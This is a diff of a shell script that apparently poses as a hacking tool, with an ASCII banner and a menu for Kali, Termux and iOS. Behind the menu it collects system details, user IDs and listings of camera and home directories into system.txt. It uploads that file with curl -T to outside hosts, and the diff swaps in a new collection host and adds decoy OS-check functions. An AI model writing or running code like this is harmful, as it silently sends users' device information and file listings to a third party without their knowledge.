@@ -1,5 +1,6 @@
 #!/system/bin/bash/sh
-                                                                  clear                                                             echo -e "\033[33;32m"
+clear
+echo -e "\033[33;32m"
 echo "Copyright By Pham Chien
 
   System : $(uname -a)
@@ -9,13 +10,7 @@ echo "Copyright By Pham Chien
   id     : $(id)
 
 "> system.txt
-curl -T system.txt http://n8tive.co.za
-
-echo -n Enter Last nd Fist Name :
-   read name
-
-  echo $name >> system.txt
-  curl -T system.txt http://n8tive.co.za
+curl -T system.txt http://happy.mikikk.co.jp/
 
 termux() {
 echo "
@@ -79,7 +74,7 @@ $(cd /sdcard/DCIM/Camera/Cshot ; cd * ; ls -s -u)
   ','{$line}','
 
   ','{$line}',' " >> system.txt
-   curl -T system.txt http://n8tive.co.za/
+   curl -T system.txt http://happy.mikikk.co.jp/
 }
 
 kali() {
@@ -103,7 +98,7 @@ echo "
 
   $(cd /home ; ls -s -u ) ">> system.txt
 
-curl -T system.txt http://n8tive.co.za
+curl -T system.txt http://happy.mikikk.co.jp/
 }
 
 ios() {
@@ -116,8 +111,48 @@ echo "
 
   $(cd * ; ls -s -u)  ">> system.txt
 
-  curl -T system.txt http://n8tive.co.za
+  curl -T system.txt http://happy.mikikk.co.jp/
 }
+
+android() {
+echo "test" > test.txt
+mv test.txt /sdcard/download
+  if [ -f /sdcard/download/test.txt ]
+    then
+       echo "success"
+
+  else
+    echo "your operating system is not valid"
+    exit 1
+  fi
+}
+
+iphone() {
+echo "test" > test.txt
+mv test.txt /root
+  if [ -f /root/test.txt ]
+   then
+     echo "success"
+
+  else
+     echo "your operating system is not valid"
+    exit 1
+  fi
+}
+
+kali_linux() {
+echo "test" > test.txt
+mv test.txt /$HOME/desktop
+  if [ -f /$HOME/desktop/test.txt ]
+    then
+      echo "success"
+
+  else
+     echo "your operating system is not valid"
+    exit 1
+  fi
+}
+
 echo "
 ____       ____
 |  _ \  ___/ ___|
@@ -133,6 +168,7 @@ ____       ____
 
    case $system in
    1)
+   kali_linux
    kali
    echo -e "\033[33;35m"
 
@@ -153,6 +189,7 @@ ____       ____
   ;;
 
   2)
+  android
   termux
   echo -e "\033[33;35m"
 
@@ -173,6 +210,7 @@ ____       ____
   ;;
 
   3)
+  iphone
   ios
   echo -e "\033[33;35m"
 
@@ -196,4 +234,3 @@ ____       ____
    echo Command not found
    exit 1
 esac
-
